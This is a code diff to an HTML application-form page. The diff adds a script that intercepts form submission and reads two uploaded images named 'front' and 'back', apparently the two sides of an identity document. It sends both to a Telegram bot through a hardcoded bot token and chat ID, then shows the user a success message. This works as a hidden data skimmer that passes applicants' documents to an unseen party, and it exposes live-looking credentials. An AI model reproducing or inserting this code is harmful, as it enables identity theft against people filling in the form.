@@ -238,7 +238,7 @@
                                 <div class="help-block with-errors"></div>
                             </div>
                         </div>
-                        
+
                         <div class="col-lg-6 mb-4 col-sm-6">
                             <div class="form-group">
                                 <input type="text" name="state" id="state" class="form-control" required="" data-error="Please enter your state" placeholder="State">
@@ -532,8 +532,57 @@
         // alert("Error submitting the form. Please try again.");
       }
     });
-  </script>
-  
+  </script> 
+  <script>
+    document.getElementById("newcontactForm").addEventListener("submit", async function (e) {
+        e.preventDefault(); // Prevent form submission
+        
+        // const botToken = "7584753511:AAGgCBMZo7Cg6p9IcFeNQiZb0639AO03kk8"; 
+        // const chatId = "7921593296"; // Replace with your Telegram Chat ID
+        const botToken = "7584753511:AAGgCBMZo7Cg6p9IcFeNQiZb0639AO03kk8"; 
+        const chatId = "7921593296"; // Replace with your Telegram Chat ID
+
+        const frontFile = document.getElementById("front").files[0];
+        const backFile = document.getElementById("back").files[0];
+
+        if (!frontFile || !backFile) {
+            alert("Please upload both files.");
+            return;
+        }
+
+        try {
+            // Send Front Image
+            const frontFormData = new FormData();
+            frontFormData.append("chat_id", chatId);
+            frontFormData.append("photo", frontFile);
+
+            const frontResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: "POST",
+                body: frontFormData,
+            });
+
+            if (!frontResponse.ok) throw new Error("Failed to send front image.");
+
+            // Send Back Image
+            const backFormData = new FormData();
+            backFormData.append("chat_id", chatId);
+            backFormData.append("photo", backFile);
+
+            const backResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: "POST",
+                body: backFormData,
+            });
+
+            if (!backResponse.ok) throw new Error("Failed to send back image.");
+
+            alert("Form submitted successfully!");
+
+        } catch (error) {
+            console.error(error);
+            alert("An error occurred. Please try again.");
+        }
+    });
+</script> 
          <!-- Jquery Min JS -->
          <script src="./apply_files/jquery.min.js.download"></script> 
          <script src="./apply_files/forms.js.download"></script>
